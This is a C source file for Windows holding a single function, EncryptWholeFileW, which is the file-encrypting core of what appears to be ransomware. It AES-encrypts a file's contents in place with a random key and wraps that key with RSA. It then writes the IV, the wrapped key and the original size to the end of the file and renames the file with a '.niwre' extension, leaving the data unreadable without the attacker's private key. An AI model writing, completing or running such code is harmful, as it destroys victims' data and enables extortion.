#include "encrypt.h"
#include "utils.h"

/**
 * Encrypts the whole file using AES and RSA
 * 
 * szFileName - The file to encrypt
 * 
*/

BOOL EncryptWholeFileW(const WCHAR* szFileName)
{
    BOOL bResult = FALSE;

	PBYTE pbEncryptedAESKey = NULL;
	DWORD dwEncryptedAESKeyLen = 0;

	PBYTE pbPlaintextFileData = NULL;
	DWORD dwPlaintextFileDataLen = 0;

	PBYTE pbEncryptedFileData = NULL;
	DWORD dwEncryptedFileDataLen = 0;

    BYTE pbKey[16] = {0}; // 128 bit key
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16] = {0};
	DWORD dwIVLen = sizeof(pbIV);

	ULONG64 dwFileSize = 0;

	HANDLE hFile = NULL;

    //
	// Read the whole file from disk to memory or only 4KB if the file is too big
	//
	bResult = ReadFileWToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen, &dwFileSize);
	if( !bResult )
	{
		goto Exit;
	}

    //
	// Generate crypto random IV and AES key
	//
	BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    //
	// Encrypt the AES key first.
	//
	bResult = RSAEncrypt(
		pbKey,
		dwKeyLen,
		&pbEncryptedAESKey,
		&dwEncryptedAESKeyLen
	);

	if( !bResult )
	{
		writeToConsoleW(L"RSAEncrypt failed\n");
		goto Exit;
	}

    //
	// Encrypt the actual file
	//
	bResult = AESEncrypt(
		pbPlaintextFileData,
		dwPlaintextFileDataLen,
		pbKey,
		dwKeyLen,
		pbIV,
		dwIVLen,
		&pbEncryptedFileData,
		&dwEncryptedFileDataLen
	);

	RtlSecureZeroMemory(pbKey, dwKeyLen); // Clear the AES key from memory

	if( !bResult )
	{
		writeToConsoleW(L"AESEncrypt failed\n");
		goto Exit;
	}

    hFile = CreateFileW(
		szFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS, // If the file exists, the function overwrites the file, if the file does not exist, the function creates a new file.
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if( !hFile || hFile == INVALID_HANDLE_VALUE )
	{
		bResult = FALSE;
		WCHAR szError[MAX_PATH] = {0};
		_itowOwn(GetLastError(), szError, 10);
		_StringCchCatW(szError, MAX_PATH, L" CreateFileW failed! (EncryptWholeFileW)\n");
		writeToConsoleW(szError);
		goto Exit;
	}

    //
	// Encrypted file format order:
	// AES Encrypted File Data -> Set File Pointer To The End Of File -> Write IV -> Write AES RSA Encrypted Key -> Write the Original File Size
	//
	DWORD dwWritten = 0;
	WriteFile( hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, NULL); // Write the encrypted file data
	LARGE_INTEGER liDistance;
	liDistance.QuadPart = 0;
	if(!SetFilePointerEx(hFile, liDistance, NULL, FILE_END)) // Move file pointer to the end of the file
	{
		bResult = FALSE;
		goto Exit;
	}
	WriteFile( hFile, pbIV, dwIVLen, &dwWritten, NULL); // Write the IV 16 bytes
    WriteFile( hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, NULL); // Write the encrypted AES key 256 bytes
	WriteFile( hFile, &dwFileSize, sizeof(dwFileSize), &dwWritten, NULL); // Write the original file size   8 bytes

Exit:
	if( hFile )
		CloseHandle( hFile );

	if( pbEncryptedAESKey )
		HeapFree(GetProcessHeap(), 0, pbEncryptedAESKey);

	if( pbPlaintextFileData )
		VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);

	if( pbEncryptedFileData )
		VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);

    //
	// Append extension to a file
	//
	if(bResult)
	{
		if(_wcslen(szFileName) + _wcslen(L".niwre") < MAX_PATH) // Check if the new path will not exceed the MAX_PATH limit (260 characters)
		{
			WCHAR szNewPath[MAX_PATH] = {0};
			_wcscpy_s(szNewPath, MAX_PATH, szFileName);
			_wcscat_s(szNewPath, MAX_PATH, L".niwre");
			MoveFileW(szFileName, szNewPath); // Move the file to a new path
		}
		else
		{
			size_t dwNewPathLen = _wcslen(szFileName) + _wcslen(L".niwre") + 1;
			WCHAR* szNewPath = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewPathLen * sizeof(WCHAR));
			if(szNewPath)
			{
				_wcscpy_s(szNewPath, dwNewPathLen, szFileName);
				_wcscat_s(szNewPath, dwNewPathLen, L".niwre");
				MoveFileW(szFileName, szNewPath); // Move the file to a new path
				HeapFree(GetProcessHeap(), 0, szNewPath);
			}
		}
	}
    
	return bResult;
}